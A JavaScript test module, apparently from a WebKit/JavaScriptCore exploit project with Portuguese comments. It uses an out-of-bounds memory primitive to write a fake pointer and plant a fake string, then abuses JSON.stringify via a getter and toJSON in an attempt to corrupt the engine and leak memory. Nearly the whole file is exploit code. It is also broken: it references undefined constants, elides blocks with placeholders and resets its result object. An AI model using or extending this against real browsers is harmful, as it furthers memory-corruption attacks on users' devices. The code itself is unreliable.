// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, stringToAdvancedInt64Array } from '../utils.mjs'; // Certifique-se que stringToAdvancedInt64Array está em utils.mjs
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierPoisonV3"; // Novo nome para clareza
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    json_output_external: null, // Para armazenar o resultado do stringify externo
    leaks_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_FOR_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor que aciona o getter

const OOB_AB_FILL_PATTERN = 0xFEFEFEFE;
const OOB_AB_SNOOP_SIZE = 0x400; // Sondar primeiros 1KB

// Onde plantaremos uma string de teste no oob_array_buffer_real
const FAKE_STRING_PLANT_OFFSET = 0x150; 
const FAKE_STRING_PLANTED = "PLANTED_STRING_FOR_LEAK_TEST";
// O valor que escreveremos em CORRUPTION_OFFSET_TRIGGER (0x70),
// esperando que o Stringifier o use como um ponteiro para nossa FAKE_STRING_PLANTED.
// Este valor seria o offset FAKE_STRING_PLANT_OFFSET se o Stringifier usasse o oob_ab como base.
const POINTER_LIKE_VALUE_FOR_0x70 = new AdvancedInt64(FAKE_STRING_PLANT_OFFSET, 0);


// Variável de escopo de módulo para o objeto cujo endereço ou dados queremos vazar
let target_object_for_leak_global; 

class CheckpointForStringifierPoisonV3 {
    constructor(id) {
        this.id_marker = `StrPoisonV3Chkpt-${id}`;
        // Esta propriedade será o nosso "canhão de dados" para o Stringifier
        this.data_to_be_processed_by_potentially_corrupt_stringifier = null; 
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierPoisonV3_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results.message = "Getter chamado, Stringifier potencialmente corrompido está processando 'this.data_to_be_processed_by_potentially_corrupt_stringifier'.";
        let details_log_g = [];

        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_ab ou oob_read_absolute não disponíveis.");
            }
            
            // O JSON.stringify externo já está em processo, usando o Stringifier (potencialmente corrompido).
            // Ele estará tentando serializar 'this.data_to_be_processed_by_potentially_corrupt_stringifier'.
            // Se o Stringifier corrompido usou o valor em oob_data[0x70] (FAKE_STRING_POINTER_VALUE_FOR_TRIGGER)
            // como um ponteiro para string, então a FAKE_STRING_PLANTED pode aparecer no output JSON final.
            // Ou, se ele escrever OOB, pode atingir oob_array_buffer_real.

            details_log_g.push("Getter executado. A análise principal será no output do JSON.stringify externo e na sondagem do oob_ab.");

            // Sondar oob_array_buffer_real por escritas inesperadas
            const fill_limit_g = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
            logS3("DENTRO DO GETTER: Sondando oob_ab por alterações (após Stringifier ter processado 'this')...", "info", FNAME_GETTER);
            let snoop_hits_g = [];
            for (let offset = 0; (offset + 4) <= fill_limit_g; offset += 4) {
                let skip = (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                           (offset >= FAKE_STRING_PLANT_OFFSET && offset < FAKE_STRING_PLANT_OFFSET + FAKE_STRING_PLANTED.length * 2 + 8); // Aproximado para UTF16 + terminador
                if (skip) continue;

                try {
                    const val32 = oob_read_absolute(offset, 4);
                    if (val32 !== OOB_AB_FILL_PATTERN) {
                        const val64ctx = ((offset + 8) <= fill_limit_g) ? oob_read_absolute(offset, 8).toString(true) : "N/A";
                        const leak_item = {offset: toHex(offset), value_u32: toHex(val32), value_u64_context: val64ctx, note: "Data Overwritten"};
                        snoop_hits_g.push(leak_item);
                        logS3(`LEAK NO OOB_AB? oob_data[${toHex(offset)}] = ${toHex(val32)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN)}) Contexto: ${val64ctx}`, "leak", FNAME_GETTER);
                    }
                } catch (e_snoop_g) {}
            }
            current_test_results.leaks_in_oob_ab = snoop_hits_g;
            if (snoop_hits_g.length > 0) {
                details_log_g.push(`${snoop_hits_g.length} DWORDS alterados encontrados no oob_ab.`);
                current_test_results.success = true; // Escrita no oob_ab é um sucesso
                current_test_results.message += " Potenciais escritas OOB do Stringifier no oob_ab detectadas!";
            }


        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro no getter: ${e_getter_main.message}`;
        }
        current_test_results.details = (current_test_results.details || "") + details_log_g.join('; ');
        return { "getter_string_poison_v3_check_done": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringPoisonV3.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        return { // O que o toJSON retorna para o JSON.stringify
            id: this.id_marker,
            // Crucial: Fazer o Stringifier processar esta propriedade.
            // Se o Stringifier estiver usando o valor de oob_data[0x70] como ponteiro para string,
            // ele pode tentar ler a FAKE_STRING_PLANTED.
            stringified_prop: this.property_that_might_use_poisoned_string_ptr,
            processed_by_poison_v3_test_toJSON: true
        };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringPoisonTestRunnerV3";
    logS3(`--- Iniciando Teste de Envenenamento de String do Stringifier (v3) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };
    target_object_for_leak_global = null;

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Preencher oob_array_buffer_real com padrão ANTES de qualquer escrita
        const fill_limit_runner = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
        logS3(`Preenchendo oob_ab de 0 a ${toHex(fill_limit_runner)} com ${toHex(OOB_AB_FILL_PATTERN)} (exceto área do gatilho)...`, "info", FNAME_TEST_RUNNER);
        for (let offset = 0; offset < fill_limit_runner; offset += 4) {
             if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue;
             try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e){}
        }
        logS3("oob_array_buffer_real preenchido com padrão.", "info", FNAME_TEST_RUNNER);

        // 2. Plantar a STRING FALSA no oob_array_buffer_real em FAKE_STRING_TARGET_OFFSET_IN_OOB_AB
        if (typeof stringToAdvancedInt64Array === "function") {
            const fake_str_byte_array = stringToAdvancedInt64Array(FAKE_STRING_PLANTED, true); 
            let write_at = FAKE_STRING_TARGET_OFFSET_IN_OOB_AB;
            for(const adv64 of fake_str_byte_array) {
                if (write_at + 8 <= oob_array_buffer_real.byteLength) {
                    oob_write_absolute(write_at, adv64, 8);
                    write_at += 8;
                } else { break; }
            }
            logS3(`String falsa "${FAKE_STRING_PLANTED}" plantada em oob_data[${toHex(FAKE_STRING_TARGET_OFFSET_IN_OOB_AB)}]`, "info", FNAME_TEST_RUNNER);
        } else {
            logS3("AVISO: stringToAdvancedInt64Array não disponível. String falsa não plantada.", "warn", FNAME_TEST_RUNNER);
        }

        // 3. Escrita OOB Gatilho: Escrever o PONTEIRO (offset relativo) para a string falsa em CORRUPTION_OFFSET_TRIGGER (0x70).
        logS3(`Escrevendo "ponteiro falso" ${FAKE_STRING_POINTER_VALUE_FOR_TRIGGER.toString(true)} (offset para string plantada) em oob_data[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_TEST_RUNNER);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, FAKE_STRING_POINTER_VALUE_FOR_TRIGGER, 8);
        logS3(`Escrita OOB gatilho com ponteiro falso completada.`, "info", FNAME_TEST_RUNNER);

        // 4. Criar o objeto checkpoint
        const checkpoint_obj = new CheckpointForStringifierPoisonV3(1);
        // O objeto que queremos que o Stringifier tente ler (usando o ponteiro falso)
        // é a FAKE_STRING_PLANTED. O Stringifier tentará ler this.property_that_might_use_poisoned_string_ptr.
        // Se o ponteiro para o NOME ou VALOR dessa propriedade for o que está em 0x70.
        // Vamos definir a propriedade com algo simples por enquanto. O teste é se o *valor* de 0x70 é usado como ponteiro.
        checkpoint_obj.property_that_might_use_poisoned_string_ptr = "SHOULD_BE_REPLACED_BY_FAKE_STRING";
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        // 5. Chamar JSON.stringify
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output_ext = "";
        try {
            final_json_output_ext = JSON.stringify(checkpoint_obj);
            current_test_results.json_output_external = final_json_output_ext.substring(0, 500); // Salvar output externo
            logS3(`JSON.stringify EXTERNO completado. Output (parcial): ${final_json_output_ext.substring(0,200)}...`, "info", FNAME_TEST_RUNNER);
            
            if (final_json_output_ext.includes(FAKE_STRING_PLANTED)) {
                current_test_results.success = true;
                current_test_results.message = (current_test_results.message || "") + " SUCESSO! String Falsa VAZADA no output JSON EXTERNO!";
                logS3(current_test_results.message, "vuln", FNAME_TEST_RUNNER);
            }

        } catch (e_json_ext) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRING POISON (v3): SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRING POISON (v3): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        // ... (logging detalhado dos leaks) ...
        if (current_test_results.leaks_in_oob_ab && current_test_results.leaks_in_oob_ab.length > 0) {
            logS3("--- Dados Alterados/Vazados no oob_array_buffer_real (do Getter) ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_in_oob_ab.forEach(item => {
                logS3(`  Offset ${item.offset}: ${item.value} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }

    } else {
         logS3("RESULTADO TESTE STRING POISON (v3): Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
         // ... (log de erro se houver)
    }

    clearOOBEnvironment();
    logS3(`--- Teste de Envenenamento de String do Stringifier (v3) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
